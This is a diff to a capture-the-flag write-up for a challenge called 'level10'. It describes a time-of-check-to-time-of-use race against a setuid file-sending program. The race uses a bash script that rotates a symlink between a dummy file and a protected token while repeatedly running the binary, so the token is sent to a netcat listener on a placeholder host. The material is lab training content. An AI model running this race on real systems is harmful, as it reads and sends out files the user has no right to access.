@@ -2,7 +2,6 @@
 
 This is the most interesting challenge. Once again we have an unreadable token file and a `level10` executable with the setuid bit set.
 
-
 ```
 $ ./level10
 ./level10 file host
@@ -11,19 +10,24 @@ $ ./level10
 
 The disassembled code is much bigger, but it indeed looks like a file sending program. It first checks with `access` if we have the rights to the file, then connects to port `6969` of the given host and sends the file.
 
-The first step was to launch a server on port `6969` on the host machine. We used an early version of the IRC server but there are probably easier services to setup.
+The first step was to launch a server on port `6969` on the host machine: `nc -lk 6969`
 
 Now comes the TOCTOU attack (time-of-check to time-of-use). Since the program doesn't run infinitely fast, there is a gap between the `access` check and the sending of the file. We can exploit it by rotating symbolic links. One link must be a file readable by us, another must be `token`.
+
+First create a dummy file where you have the access rights: `echo garbage > /tmp/garbage`
 
 ```bash
 #!/bin/bash
 
 while true; do
-    ln -sf /etc/passwd /tmp/exploit_link
+    ln -sf /tmp/garbage /tmp/exploit_link
     ln -sf /home/user/level10/token /tmp/exploit_link
 done &
 
-/home/user/level10/level10 /tmp/exploit_link 10.x.x.x
+while true; do
+    /home/user/level10/level10 /tmp/exploit_link 10.x.x.x
+done
+
 kill $(jobs -p)
 ```
 
